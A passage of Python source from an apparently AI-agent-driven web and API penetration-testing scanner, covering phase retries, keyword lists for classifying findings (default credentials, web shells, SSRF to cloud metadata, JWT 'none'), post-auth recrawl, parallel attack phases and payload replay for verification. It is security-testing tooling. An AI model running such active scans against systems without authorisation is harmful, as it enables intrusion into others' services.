                "web_a10": "ssrf", "api_ssrf": "ssrf",
                "web_file_upload": "file_upload",
                "web_password_reset": "password_reset",
                "web_session_mgmt": "session_mgmt",
                "api_mass_assign": "mass_assign",
                "api_data_exposure": "data_exposure",
            }

            _PHASE_CORE_KEYWORDS: dict[str, tuple[str, ...]] = {
                "web_a07": (
                    "default credential", "weak password", "credential stuffing",
                    "brute force successful", "admin:admin", "login bypass",
                    "authentication bypass", "auth bypass", "cracked password",
                    "sql injection authentication", "valid credentials",
                    "default password", "credentials accepted",
                ),
                "api_auth": (
                    "default credential", "weak password", "credential stuffing",
                    "brute force successful", "admin:admin", "login bypass",
                    "authentication bypass", "auth bypass", "valid credentials",
                    "default password", "credentials accepted", "broken token",
                    "jwt alg", "jwt none", "missing authentication",
                ),
                "web_a01": (
                    "broken access", "access control", "forced browsing", "idor",
                    "authorization bypass", "privilege escalation", "admin panel",
                    "horizontal escalation", "vertical escalation", "role bypass",
                    "method tampering", "parameter pollution",
                ),
                "api_authz": (
                    "bola", "broken object level", "idor", "authorization bypass",
                    "horizontal escalation", "vertical escalation", "access control",
                    "role bypass", "privilege escalation",
                ),
                "web_bfla": (
                    "bfla", "broken function level", "function level authorization",
                    "privilege escalation", "role bypass", "admin function",
                ),
                "api_bfla": (
                    "bfla", "broken function level", "function level authorization",
                    "privilege escalation", "role bypass", "admin endpoint",
                ),
                "web_a03_sqli": (
                    "sql injection", "sqli", "blind sql", "union-based",
                    "boolean-based", "time-based sql", "error-based sql",
                ),
                "web_a03_xss": (
                    "xss", "cross-site scripting", "reflected script",
                    "stored script", "dom-based xss", "script injection",
                ),
                "web_a03_cmdi": (
                    "command injection", "os command", "shell injection",
                    "remote code execution", "rce",
                ),
                "web_a03_ssti": (
                    "template injection", "ssti", "server-side template",
                ),
                "web_a03_path_traversal": (
                    "path traversal", "directory traversal", "lfi",
                    "local file inclusion", "arbitrary file read",
                ),
                "web_a03_xxe": (
                    "xxe", "xml external entity", "external entity",
                ),
                "api_injection": (
                    "sql injection", "sqli", "command injection",
                    "xss", "cross-site scripting", "template injection",
                    "xxe", "path traversal", "nosql injection", "ldap injection",
                ),
                "web_a10": (
                    "ssrf", "server-side request forgery", "internal network",
                    "cloud metadata", "169.254.169.254",
                ),
                "api_ssrf": (
                    "ssrf", "server-side request forgery", "internal network",
                    "cloud metadata", "169.254.169.254",
                ),
                "web_file_upload": (
                    "arbitrary file upload", "unrestricted file upload",
                    "file upload rce", "remote code execution", "rce via upload",
                    "webshell", "web shell", "php shell", "jsp shell",
                    "executable upload", "double extension",
                ),
                "web_password_reset": (
                    "password reset host header", "host header injection",
                    "account takeover", "reset token reuse", "reset token not invalidated",
                    "predictable reset token", "account enumeration",
                    "password reset poisoning", "missing old password",
                ),
                "web_session_mgmt": (
                    "session fixation", "session not invalidated",
                    "session token in url", "missing httponly", "missing secure flag",
                    "missing samesite", "insecure cookie", "session reuse",
                    "long-lived session", "predictable session",
                ),
                "api_mass_assign": (
                    "mass assignment", "privilege escalation to admin",
                    "role=admin", "isadmin", "price tampering",
                    "ownership takeover", "parameter tampering escalation",
                    "unauthorized field modification",
                ),
                "api_data_exposure": (
                    "excessive data exposure", "sensitive data exposure",
                    "pii leak", "password hash in response", "api key in response",
                    "secret in response", "verbose error", "stack trace exposed",
                    "debug endpoint", "internal id leak", "internal field leak",
                    "unfiltered list endpoint",
                ),
            }

            def _phase_has_core_finding() -> bool:
                keywords = _PHASE_CORE_KEYWORDS.get(phase.id)
                if not keywords:
                    return phase_new_findings > 0
                for f in findings[phase_findings_before:]:
                    text = (
                        (f.get("title") or "") + " "
                        + (f.get("description") or "") + " "
                        + (f.get("vulnerability_type") or "") + " "
                        + (f.get("category") or "")
                    ).lower()
                    if any(kw in text for kw in keywords):
                        return True
                return False

            _core_class_missing = (
                phase.id in _PHASE_CORE_KEYWORDS
                and not _phase_has_core_finding()
                and phase_evidence
            )

            if (phase.id in _ACTIVE_RETRY_PHASES
                    and (phase_new_findings == 0 or _core_class_missing)
                    and phase_evidence
                    and not getattr(phase, "_retried", False)):
                phase._retried = True
                evidence_text = _format_evidence_buffer(phase_evidence)
                prompt_key = _PHASE_TO_PROMPT_KEY.get(phase.id, "injection")
                retry_prompt = _RETRY_PROMPTS[prompt_key].format(
                    name=phase.name, evidence=evidence_text
                )
                _retry_reason = (
                    "zero findings" if phase_new_findings == 0
                    else "no core-class finding"
                )
                logger.info(
                    "Phase %s: retry triggered (%s) with %d evidence records",
                    phase.name, _retry_reason, len(phase_evidence),
                )
                print(f" [RETRY] {phase.name}: {_retry_reason}, retrying with tool calls...")
                _cb("phase_start", {"phase": phase_num, "total": total_phases,
                                    "name": f"{phase.name} (retry)", "id": f"{phase.id}_retry"})
                messages.append({"role": "user", "content": retry_prompt})
                phase_evidence_retry: list[dict] = []
                retry_findings_before = len(findings)
                retry_tool_calls = 0
                for retry_step in range(phase.max_steps):
                    _check_cancel()
                    try:
                        _sanitize_all_messages(messages)
                        messages = _repair_tool_pairs(messages)
                        response = router.complete(model=model, messages=messages,
                                                   tools=TOOL_DEFINITIONS, cancel_flag=cancel_flag)
                    except (ContentFiltered, ContextWindowExceeded, MalformedMessages):
                        break
                    except ScanCancelled:
                        raise
                    _check_cancel()
                    if not response or not getattr(response, "choices", None):
                        break
                    msg = response.choices[0].message
                    msg_dict = msg.model_dump() if hasattr(msg, "model_dump") else dict(msg)
                    msg_dict = _sanitize_message(msg_dict)
                    messages.append(msg_dict)
                    tool_calls = msg_dict.get("tool_calls") or getattr(msg, "tool_calls", None) or []
                    if tool_calls:
                        for tc in tool_calls:
                            _check_cancel()
                            tc_id = tc.get("id") if isinstance(tc, dict) else getattr(tc, "id", "")
                            fn = tc.get("function") if isinstance(tc, dict) else getattr(tc, "function", {})
                            fn_name = fn.get("name") if isinstance(fn, dict) else getattr(fn, "name", "")
                            fn_name = _sanitize_tool_name(fn_name)
                            fn_args = fn.get("arguments") if isinstance(fn, dict) else getattr(fn, "arguments", "{}")
                            result = await tools.execute(fn_name, fn_args)
                            retry_tool_calls += 1
                            metrics["total_tool_calls"] += 1
                            messages.append({"role": "tool", "tool_call_id": tc_id,
                                             "content": _cap_result(result)})
                            try:
                                args_parsed = json.loads(fn_args) if isinstance(fn_args, str) else fn_args
                            except Exception:
                                args_parsed = {"raw": fn_args}
                            resp_summary = {
                                k: v for k, v in result.items()
                                if k in ("status", "url", "error", "reflected", "anomaly", "body_snippet", "results", "accessible", "title", "forms")
                            } if isinstance(result, dict) else str(result)[:200]
                            _cb("tool_call", {
                                "phase": f"{phase.name} (retry)",
                                "tool": fn_name,
                                "request": {k: str(v)[:300] for k, v in args_parsed.items()} if isinstance(args_parsed, dict) else str(args_parsed)[:400],
                                "response": {k: str(v)[:200] for k, v in resp_summary.items()} if isinstance(resp_summary, dict) else str(resp_summary)[:400],
                            })
                            is_sec = fn_name in SECURITY_TEST_TOOLS
                            if not is_sec and fn_name == "navigate":
                                nav_url = (args_parsed.get("url") or "") if isinstance(args_parsed, dict) else ""
                                if any(m in nav_url for m in _INJECTION_MARKERS):
                                    is_sec = True
                            if is_sec:
                                metrics["test_log"].append({"phase": phase.id, "tool": fn_name,
                                                            "request": args_parsed, "response_summary": resp_summary})
                                _capture_evidence(phase_evidence_retry, fn_name, args_parsed, resp_summary, result)
                        if retry_tool_calls % 5 == 0 and _estimate_tokens(messages) > TRIM_TARGET_TOKENS:
                            messages = trim_context(messages, max_tokens=TRIM_TARGET_TOKENS)
                    else:
                        content = msg_dict.get("content") or ""
                        retry_f = extract_findings(str(content))
                        if not retry_f and phase_evidence_retry:
                            ev_text = _format_evidence_buffer(phase_evidence_retry)
                            messages.append({"role": "user", "content": ev_text})
                            try:
                                ev_resp = router.complete(model=model, messages=messages, tools=[], cancel_flag=cancel_flag)
                                if ev_resp and getattr(ev_resp, "choices", None):
                                    retry_f = extract_findings(str(ev_resp.choices[0].message.content or ""))
                            except Exception:
                                pass
                        findings.extend(retry_f)
                        for f in retry_f:
                            f["phase"] = f"{phase.name} (retry)"
                            _match_evidence_to_finding(f, phase_evidence_retry or phase_evidence)
                            _cb("finding", f)
                        break
                retry_new = len(findings) - retry_findings_before
                phase_new_findings += retry_new
                phase_tool_calls += retry_tool_calls
                print(f" [RETRY] {retry_tool_calls} tool calls, {retry_new} findings")
                _cb("phase_end", {"phase": phase_num, "name": f"{phase.name} (retry)",
                                  "tool_calls": retry_tool_calls, "findings": retry_new})

            elif phase_new_findings == 0 and phase_evidence:
                summary_prompt = (
                    f"Phase '{phase.name}' completed with 0 vulnerabilities reported, "
                    "but you performed security tests. Review the evidence below and "
                    "output ANY confirmed vulnerabilities as JSON findings.\n\n"
                    + _format_evidence_buffer(phase_evidence)
                )
                messages.append({"role": "user", "content": summary_prompt})
                try:
                    _check_cancel()
                    summary_resp = router.complete(
                        model=model, messages=messages, tools=[],
                        cancel_flag=cancel_flag,
                    )
                    if summary_resp and getattr(summary_resp, "choices", None):
                        summary_f = extract_findings(
                            str(summary_resp.choices[0].message.content or "")
                        )
                        if summary_f:
                            findings.extend(summary_f)
                            for f in summary_f:
                                f["phase"] = phase.name
                                _match_evidence_to_finding(f, phase_evidence)
                                _cb("finding", f)
                            phase_new_findings += len(summary_f)
                            logger.info(
                                "Phase %s: evidence summary recovered %d findings",
                                phase.name, len(summary_f),
                            )
                except ScanCancelled:
                    raise
                except Exception as e:
                    logger.warning("Evidence summary failed for %s: %s", phase.name, e)

            metrics["phases_completed"] += 1
            metrics["phase_log"].append({
                "phase": phase.id,
                "name": phase.name,
                "tool_calls": phase_tool_calls,
                "findings_count": phase_new_findings,
                "evidence_buffer": phase_evidence[:60],
            })
            print(f" {phase_tool_calls} tool calls, {phase_new_findings} findings")
            _cb("phase_end", {"phase": phase_num, "name": phase.name, "tool_calls": phase_tool_calls, "findings": phase_new_findings})
            messages = trim_context(messages, max_tokens=TRIM_TARGET_TOKENS)

            # ── Stage-A per-phase host-delta passive check ──────────────
            # Drain browser-observed in-scope https hostnames (populated
            # continuously by tools._log_request). Any host that wasn't
            # previously audited gets a one-shot TLS + security-header pass.
            # This is how SPAs that reveal sibling hosts post-auth (via XHR
            # to /api/v2 on a sibling subdomain) still get TLS-audited even
            # when the landing-page DOM / robots / sitemap didn't mention
            # them. Cheap: typical phase yields 0–2 new hosts.
            try:
                candidate_hosts = tools.get_discovered_hosts()
                if candidate_hosts - audited_hosts:
                    delta_findings = await run_host_delta_passive_check(
                        http_client=http_client,
                        candidate_hosts=candidate_hosts,
                        target_url=target.url,
                        audited_hosts=audited_hosts,
                        extra_domains=extra_set,
                    )
                    if delta_findings:
                        existing_titles = {
                            (f.get("title", "") + f.get("url", ""))
                            for f in findings
                        }
                        new_delta = [
                            f for f in delta_findings
                            if (f.get("title", "") + f.get("url", "")) not in existing_titles
                        ]
                        for f in new_delta:
                            f.setdefault("phase", f"Host-Delta Passive ({phase.name})")
                            _cb("finding", f)
                        findings.extend(new_delta)
                        if new_delta:
                            print(f"  [HOST-DELTA] +{len(new_delta)} findings on new sibling host(s)")
                            logger.info(
                                "Host-delta passive check after phase '%s': %d new findings",
                                phase.name, len(new_delta),
                            )
            except Exception as e:
                logger.warning("Host-delta passive check failed (non-fatal): %s", e)

            # ── Re-run passive recon after first LLM phase ──────────────
            # After the first phase the LLM has navigated/interacted with
            # the SPA. Dynamic iframes and lazy-loaded scripts may now be
            # present that weren't visible during the initial pass.
            # CRITICAL: If initial passive recon was skipped (not on target),
            # this is our second chance to run it on the actual target page.
            if phase_idx == 0 and not _use_fast_path:
                try:
                    print("  [PASSIVE-2] Re-running passive recon on authenticated page...")
                    p2_num = _next_phase()
                    _cb("phase_start", {"phase": p2_num, "total": 0, "name": "Passive Recon (post-auth)", "id": "passive_recon_2"})
                    extra_snips: list[tuple[str, str]] = []
                    try:
                        dom_html = await page.content()
                        if dom_html and len(dom_html.strip()) > 50:
                            extra_snips.append(("Authenticated page HTML", dom_html))
                    except Exception:
                        pass
                    p2_result = await run_passive_recon(
                        page=page,
                        http_client=http_client,
                        target_url=target.url,
                        on_finding=lambda f: _cb("finding", {**f, "phase": "Passive Recon (post-auth)"}),
                        on_progress=_passive_progress,
                        network_js_urls=network_js_urls,
                        skip_tls_sibling_discovery=_skip_tls_siblings,
                        extra_text_snippets=extra_snips or None,
                    )
                    if isinstance(p2_result, tuple):
                        p2_findings, p2_tech = p2_result
                        if p2_tech.get("technologies"):
                            tech_fingerprint = {**tech_fingerprint, **p2_tech} if tech_fingerprint else p2_tech
                    else:
                        p2_findings = p2_result
                    existing_titles = {f.get("title", "") + f.get("url", "") for f in findings}
                    new_p2 = [f for f in p2_findings if f.get("title", "") + f.get("url", "") not in existing_titles]
                    findings.extend(new_p2)
                    print(f"  [PASSIVE-2] Done: {len(p2_findings)} total, {len(new_p2)} new findings")
                    _cb("phase_end", {"phase": p2_num, "name": "Passive Recon (post-auth)",
                                      "tool_calls": 0, "findings": len(new_p2)})
                    if new_p2:
                        p2_summary = _format_passive_for_llm(new_p2)
                        messages.append({"role": "user", "content":
                            f"[SYSTEM] Additional passive recon findings from the authenticated page:\n{p2_summary}\n"
                            "Use these to inform your remaining scan phases."})
                except Exception as e:
                    logger.warning("Post-auth passive recon failed (non-fatal): %s", e)

                # ── GAP 2+6: Re-extract <a href> and <form action> URLs after LLM recon ──
                # The LLM navigated/interacted with the SPA during recon, which may
                # have revealed new links and forms (lazy-loaded content, post-auth
                # pages). Re-scrape the DOM now to capture everything the LLM uncovered.
                if page is not None:
                    try:
                        post_recon_urls = await page.evaluate("""() => {
                            const urls = new Set();
                            document.querySelectorAll('a[href]').forEach(a => {
                                if (a.href && a.href.startsWith('http')) urls.add(a.href);
                            });
                            document.querySelectorAll('form[action]').forEach(f => {
                                try {
                                    const u = new URL(f.action, location.href);
                                    if (u.protocol.startsWith('http')) urls.add(u.href);
                                } catch {}
                            });
                            return [...urls];
                        }""")
                        _post_added = 0
                        for href in (post_recon_urls or []):
                            if not _is_in_scope(href, allowed_domains):
                                continue
                            if href not in metrics["pages_list"]:
                                metrics["pages_list"].append(href)
                                metrics["pages_crawled"] += 1
                                _cb("crawl", {"url": href, "type": "page",
                                              "tool": "post_recon_extract",
                                              "count": metrics["pages_crawled"]})
                                _post_added += 1
                        if _post_added:
                            print(f"  [POST-RECON] Extracted {_post_added} new URLs (hrefs+forms) after LLM recon")
                    except Exception as e:
                        logger.debug("Post-recon URL extraction failed (non-fatal): %s", e)

        # ── Post-auth SPA re-crawl (smaller budget) ─────────────────
        if (page is not None
            and target.scan_mode in ("website", "both")
            and auth_success
            and not _use_fast_path):
            try:
                from .spa_crawler import run_spa_crawl
                print("  [SPA-2] Re-crawling SPA post-authentication...")
                p_spa2 = _next_phase()
                _cb("phase_start", {"phase": p_spa2, "total": 0,
                                    "name": "SPA Crawl (post-auth)", "id": "spa_crawl_post_auth"})

                def _spa2_progress(event, data):
                    _cb("progress_msg", {"message": f"[SPA-2] {event}: {data}"})

                spa2_endpoints, spa2_oos = await run_spa_crawl(
                    page=page,
                    target_url=target.url,
                    target_host=(urlparse(target.url).hostname or "").lower(),
                    allowed_hosts=allowed_domains,
                    max_duration_s=30,
                    max_clicks=30,
                    on_progress=_spa2_progress,
                )
                _spa2_added = 0
                for ep in spa2_endpoints:
                    if _is_in_scope(ep.url, allowed_domains):
                        if ep.url not in metrics["pages_list"]:
                            metrics["pages_list"].append(ep.url)
                            metrics["pages_crawled"] += 1
                            _cb("crawl", {"url": ep.url, "type": "api",
                                          "tool": "spa_crawl_post_auth",
                                          "count": metrics["pages_crawled"]})
                            _spa2_added += 1
                        registry.add([ep])
                print(f"  [SPA-2] Post-auth crawl: +{_spa2_added} new endpoints")
                _cb("phase_end", {"phase": p_spa2, "name": "SPA Crawl (post-auth)",
                                  "tool_calls": 0, "findings": 0})
            except Exception as e:
                logger.debug("Post-auth SPA re-crawl failed (non-fatal): %s", e)

        # ── Crawl coverage metric ────────────────────────────────────
        _crawled_total = metrics.get("pages_crawled", 0)
        _crawled_list = metrics.get("pages_list", [])
        _unique_paths: set[str] = set()
        for _cu in _crawled_list:
            try:
                _unique_paths.add(urlparse(_cu).path)
            except Exception:
                pass
        _coverage = {
            "total_urls": len(_crawled_list),
            "unique_paths": len(_unique_paths),
            "pages_crawled": _crawled_total,
        }
        _cb("progress_msg", {"message": f"[CRAWL-COVERAGE] {_coverage}"})
        if _crawled_total < 5:
            print(f"  [CRAWL-COVERAGE] Warning: only {_crawled_total} pages crawled. "
                  f"Coverage may be limited. Consider adding authentication or "
                  f"increasing crawl budget.")

        # ── Parallel Vuln-Testing Fan-Out ─────────────────────────────
        if run_in_parallel:
            _check_cancel()
            # Inject crawled URLs with query params into registry so parallel
            # workers (especially XSS) know about discovered parameters.
            from urllib.parse import parse_qs as _pqs
            _pages = metrics.get("pages_list", [])
            _injected = 0
            print(f"  [PARAM-INJECT] pages_list has {len(_pages)} URLs")
            for page_url in _pages:
                try:
                    parsed = urlparse(page_url)
                    if not (parsed.query and parsed.scheme in ("http", "https")):
                        continue
                    qp = {k: v[0] if v else ""
                          for k, v in _pqs(parsed.query, keep_blank_values=True).items()}
                    if not qp:
                        continue
                    from scanners.ai_agent.api_import import APIEndpoint
                    registry.add([APIEndpoint(
                        method="GET",
                        url=page_url,
                        path=parsed.path or "/",
                        headers={},
                        query_params=qp,
                        body=None,
                        body_type="none",
                        auth_type="none",
                        auth_value=None,
                        tags=["crawled"],
                        variables={},
                        original_name=f"crawled:{parsed.path}",
                    )])
                    _injected += 1
                except Exception:
                    pass
            if _injected:
                print(f"  [PARAM-INJECT] Injected {_injected} URLs with query params into registry")
            print(f"  [PARALLEL] Launching {len(run_in_parallel)} vuln phases concurrently...")
            _cb("parallel_start", {
                "phases": [p.id for p in run_in_parallel],
                "workers": min(len(run_in_parallel), MAX_PARALLEL_WORKERS),
            })

            auth_cookies: list[dict] = []
            if page:
                try:
                    auth_cookies = await page.context.cookies()
                except Exception:
                    pass
            _par_auth_headers = auth_session.get_auth_header() if auth_session else {}

            par_findings, par_logs = await run_phases_parallel(
                phases=run_in_parallel,
                system_prompt=system_prompt,
                model=model,
                router=router,
                browser=browser,
                auth_cookies=auth_cookies,
                http_client=http_client,
                registry=registry,
                allowed_domains=allowed_domains,
                target_url=target.url,
                cancel_flag=cancel_flag,
                pause_flag=pause_flag,
                exclude_urls=getattr(target, "exclude_urls", None) or [],
                prior_findings=findings,
                on_progress=_cb,
                max_workers=MAX_PARALLEL_WORKERS,
                auth_headers=_par_auth_headers,
            )
            findings.extend(par_findings)
            for log in par_logs:
                metrics["phase_log"].append(log)
                metrics["total_tool_calls"] += log.get("tool_calls", 0)
            metrics["phases_completed"] += len(run_in_parallel)
            print(f"  [PARALLEL] Done: {len(par_findings)} new findings from "
                  f"{len(run_in_parallel)} parallel phases")
            _cb("parallel_end", {
                "findings": len(par_findings), "phases": len(run_in_parallel),
            })

            # ── Reactive Chain Analysis (parallel) ────────────────────
            chain_phases = _select_reactive_chains(findings)
            if chain_phases:
                _check_cancel()
                print(f"  [CHAINS] {len(chain_phases)} chain categories triggered by findings:")
                for cp in chain_phases:
                    print(f"    - {cp.name}")
                _cb("chains_start", {
                    "phases": [cp.id for cp in chain_phases],
                })

                chain_findings, chain_logs = await run_phases_parallel(
                    phases=chain_phases,
                    system_prompt=system_prompt,
                    model=model,
                    router=router,
                    browser=browser,
                    auth_cookies=auth_cookies,
                    http_client=http_client,
                    registry=registry,
                    allowed_domains=allowed_domains,
                    target_url=target.url,
                    cancel_flag=cancel_flag,
                    pause_flag=pause_flag,
                    exclude_urls=getattr(target, "exclude_urls", None) or [],
                    prior_findings=findings,
                    on_progress=_cb,
                    max_workers=MAX_PARALLEL_WORKERS,
                    auth_headers=_par_auth_headers,
                )
                findings.extend(chain_findings)
                for log in chain_logs:
                    metrics["phase_log"].append(log)
                    metrics["total_tool_calls"] += log.get("tool_calls", 0)
                print(f"  [CHAINS] Done: {len(chain_findings)} chain findings")
                _cb("chains_end", {"findings": len(chain_findings)})
            else:
                print("  [CHAINS] No chain categories triggered — skipping")

        metrics["api_endpoints_found"] = len(registry.get_all())
        print(f"  [DONE] Pages: {metrics['pages_crawled']}, Forms: {metrics['forms_found']}, APIs: {metrics['api_endpoints_found']}, Findings: {len(findings)}")

        # ── Runtime Verification Phase (no LLM, replays payloads) ──
        _check_cancel()
        if findings:
            verify_num = _next_phase()
            _cb("phase_start", {"phase": verify_num, "total": total_phases, "name": "Runtime Verification", "id": "verification"})
            print("  [VERIFY] Replaying payloads to confirm findings...")
            try:
                from scripts.runtime_verifier import verify_all_findings

                def _verify_progress(idx, total, title, verdict):
                    _cb("tool_call", {
                        "phase": "Runtime Verification",
                        "tool": "verify_replay",
                        "request": {"finding": title[:80], "step": f"{idx}/{total}"},
                        "response": {"verdict": verdict},
                    })

                verified = await verify_all_findings(
                    findings,
                    target_url=target.url,
                    cookies=cookie_dict,
                    headers=headers,
                    on_progress=_verify_progress,
                    cancel_flag=cancel_flag,
                    pause_flag=pause_flag,
                    on_pause=_cb,
                )

                confirmed = sum(1 for f in verified if f.get("verdict") == "CONFIRMED")
                disproved = sum(1 for f in verified if f.get("verdict") == "DISPROVED")
                inconclusive = sum(1 for f in verified if f.get("verdict") == "INCONCLUSIVE")
                unverified = sum(1 for f in verified if f.get("verdict") == "UNVERIFIED")

                print(f"  [VERIFY] {confirmed} confirmed, {disproved} disproved, "
                      f"{inconclusive} inconclusive, {unverified} unverified")

                metrics["verification"] = {
                    "confirmed": confirmed,
                    "disproved": disproved,
                    "inconclusive": inconclusive,
                    "unverified": unverified,
                }
                # Re-classify now that verdict + verified are populated:
                # CONFIRMED gets a small CVSS boost, DISPROVED collapses to 0.
                for f in verified:
                    f.update(classify_severity(f))
                findings = verified
            except Exception as e:
                print(f"  [VERIFY] Verification failed (non-fatal): {e}")
                logger.warning("Runtime verification failed: %s", e, exc_info=True)

            _cb("phase_end", {"phase": verify_num, "name": "Runtime Verification",
                              "tool_calls": len(findings), "findings": 0})

        auth_session.stop_monitor()
        await http_client.aclose()
        await browser.close()

    return findings, metrics


def _extract_json_objects(text: str):
    depth = 0
    start = -1
    for i, c in enumerate(text):
        if c == "{":
            if depth == 0:
                start = i
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0 and start >= 0:
                yield text[start : i + 1]


def _has_evidence(obj: dict) -> bool:
    """Return True if the finding has real proof — a non-empty payload or evidence field."""
    payload = _s(obj.get("payload")).strip()
    evidence = _s(obj.get("evidence")).strip()
    return bool(payload) or bool(evidence)


def _process_finding_obj(obj: dict, findings: list[dict], rejected: list[str],
                         require_evidence: bool, dedup: bool = False) -> None:
    """Process a single JSON object: extract findings from it or its wrapper keys."""
    if isinstance(obj, dict):
        if "title" in obj and "severity" in obj:
            if require_evidence and not _has_evidence(obj):
                rejected.append(obj.get("title", "?"))
                return
            # Normalise severity / CVSS / CWE deterministically before dedup so that
            # two identical findings with different LLM-assigned severities still
            # collapse together.
            obj.update(classify_severity(obj))
            if dedup and any(f.get("title") == obj.get("title") and f.get("severity") == obj.get("severity") for f in findings):
                return
            findings.append(obj)
        else:
            for wrapper_key in ("findings", "results", "vulnerabilities", "issues"):
                inner = obj.get(wrapper_key)
                if isinstance(inner, list):
                    for item in inner:
                        if isinstance(item, dict) and "title" in item and "severity" in item:
                            _process_finding_obj(item, findings, rejected, require_evidence, dedup)


def extract_findings(content: str, *, require_evidence: bool = True) -> list[dict]:
    findings: list[dict] = []
    rejected: list[str] = []
    if not content:
        return findings

    for block in re.findall(r"```(?:json)?\s*([\s\S]*?)```", content):
        for obj_str in _extract_json_objects(block.strip()):
            try:
                obj = json.loads(obj_str)
                _process_finding_obj(obj, findings, rejected, require_evidence)
            except json.JSONDecodeError:
                pass

    for obj_str in _extract_json_objects(content):
        try:
            obj = json.loads(obj_str)
            _process_finding_obj(obj, findings, rejected, require_evidence, dedup=True)
        except json.JSONDecodeError:
            pass

    if rejected:
        logger.warning("Rejected %d finding(s) without payload/evidence: %s",
                       len(rejected), "; ".join(rejected[:5]))

    return findings


def _recover_messages(messages: list[dict]) -> list[dict]:
    """Last-resort recovery: strip back to the last complete user/assistant exchange.
    Keeps system message + summary + walks backward to find a safe cut point."""
    if len(messages) <= 2:
        return messages

    safe = [messages[0]]
    cut = len(messages)
    for i in range(len(messages) - 1, 0, -1):
        m = messages[i]
        if m.get("role") == "user" and m.get("content"):
            cut = i + 1
            break
    safe.extend(messages[1:cut])
    safe = _repair_tool_pairs(safe)

    if len(safe) < 2:
        safe = [messages[0], {
            "role": "user",
            "content": "[Previous context was reset due to a message formatting error. Continue scanning from where you left off.]",
        }]
    logger.info("Message recovery: %d -> %d messages", len(messages), len(safe))
    return safe


def _repair_tool_pairs(messages: list[dict]) -> list[dict]:
    """Ensure every assistant(tool_calls) is followed by its tool results and
    no orphaned tool messages exist.  Bedrock rejects malformed sequences."""
    if not messages:
        return messages

    pending_tc_ids: set[str] = set()
    repaired: list[dict] = []

    for m in messages:
        role = m.get("role")
        if role == "tool":
            tc_id = m.get("tool_call_id", "")
            if tc_id not in pending_tc_ids:
                continue
            repaired.append(m)
            pending_tc_ids.discard(tc_id)
        else:
            if pending_tc_ids:
                while repaired and repaired[-1].get("role") == "tool":
                    repaired.pop()
                if repaired and repaired[-1].get("tool_calls"):
                    repaired.pop()
                pending_tc_ids.clear()

            repaired.append(m)
            if role == "assistant" and m.get("tool_calls"):
                for tc in m["tool_calls"]:
                    tc_id = tc.get("id") if isinstance(tc, dict) else getattr(tc, "id", "")
                    if tc_id:
                        pending_tc_ids.add(tc_id)

    if pending_tc_ids:
        while repaired and repaired[-1].get("role") == "tool":
            repaired.pop()
        if repaired and repaired[-1].get("tool_calls"):
            repaired.pop()

    return repaired


def trim_context(messages: list[dict], max_tokens: int = TRIM_TARGET_TOKENS) -> list[dict]:
    estimated = _estimate_tokens(messages)
    if estimated <= max_tokens:
        return messages

    for m in messages:
        if m.get("role") == "tool" and isinstance(m.get("content"), str) and len(m["content"]) > MAX_MSG_RESULT_CHARS:
            m["content"] = m["content"][:MAX_MSG_RESULT_CHARS] + '..."}'

    estimated = _estimate_tokens(messages)
    if estimated <= max_tokens:
        return messages

    kept: list[dict] = []
    if messages:
        kept.append(messages[0])

    phase_boundaries: list[int] = []
    for i, m in enumerate(messages[1:], 1):
        if m.get("role") == "user" and "content" in m:
            phase_boundaries.append(i)

    if len(phase_boundaries) <= 1:
        kept.extend(messages[1:])
        return _repair_tool_pairs(kept)

    last_start = phase_boundaries[-1]

    # Scan the system prompt for a findings context block to preserve across trims.
    # The findings context is injected into phase prompts by _build_findings_context
    # and is critical for exploit chaining — it must survive aggressive trimming.
    findings_block = ""
    for m in messages[1:last_start]:
        c = m.get("content", "") if m.get("role") == "user" else ""
        if "## Findings Discovered So Far" in c:
            start = c.index("## Findings Discovered So Far")
            findings_block = c[start:]
            break

    summary_text = "[Previous phases completed and summarized to fit token budget. Continue scanning with fresh context.]"
    if findings_block:
        summary_text += "\n\n" + findings_block

    summary = {"role": "user", "content": summary_text}
    kept.append(summary)
    kept.extend(messages[last_start:])

    if _estimate_tokens(kept) > max_tokens and len(kept) > 10:
        trimmed: list[dict] = [kept[0], kept[1]]
        trimmed.extend(kept[-8:])
        return _repair_tool_pairs(trimmed)

    return _repair_tool_pairs(kept)


def save_results(
    filepath: str,
    findings: list[dict],
    cost_summary: list[dict],
    target: ScanTarget,
    model: str,
    scan_duration: float,
    scan_metrics: dict | None = None,
) -> dict:
    total_cost = sum(c.get("cost_usd", 0) for c in cost_summary)
    total_tokens = sum(c.get("input_tokens", 0) + c.get("output_tokens", 0) for c in cost_summary)
    tool_calls = sum(c.get("calls", 0) for c in cost_summary)

    severity_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
    owasp_counts: dict[str, int] = {}
    for f in findings:
        sev = _s(f.get("severity") or "Info")
        for key in severity_counts:
            if key.lower() == sev.lower():
                severity_counts[key] += 1
                break
        else:
            severity_counts["Info"] += 1
        cat = _s(f.get("owasp_category") or "Unknown")
        owasp_counts[cat] = owasp_counts.get(cat, 0) + 1

    metrics = scan_metrics or {}

    output = {
        "scanner": "ai_agent",
        "model": model,
        "target": target.url,
        "target_id": target.id,
        "scan_mode": target.scan_mode,
        "summary": {
            "total_findings": len(findings),
            "severity_breakdown": severity_counts,
            "owasp_breakdown": owasp_counts,
            "pages_crawled": metrics.get("pages_crawled", 0),
            "pages_list": metrics.get("pages_list", []),
            "forms_found": metrics.get("forms_found", 0),
            "api_endpoints_found": metrics.get("api_endpoints_found", 0),
            "auth_pages_detected": metrics.get("auth_pages_detected", 0),
            "phases_completed": metrics.get("phases_completed", 0),
            "total_tool_calls": metrics.get("total_tool_calls", 0),
            "phase_log": metrics.get("phase_log", []),
            "test_log": metrics.get("test_log", []),
        },
        "findings": findings,
        "metadata": {
            "model": model,
            "scan_duration_seconds": round(scan_duration, 2),
            "llm_calls": tool_calls,
            "total_tokens": total_tokens,
            "cost_usd": round(total_cost, 4),
            "cost_summary_by_model": cost_summary,
        },
    }
    os.makedirs(os.path.dirname(filepath) or ".", exist_ok=True)
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(output, f, indent=2)
    return output


class DryRunScanTools(ScanTools):
    async def inject_payload(self, selector: str, payload: str) -> dict:
        return {"status": "DRY RUN", "message": "No payload injected in dry run"}


async def run_dry_scan(
    target: ScanTarget,
    model: str,
    router: LLMRouter,
    config_dir: str | None = None,
) -> dict:
    config_dir = config_dir or os.getcwd()

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=["--disable-blink-features=AutomationControlled"],
        )
        auth_session = await authenticate(browser, target, router, model)
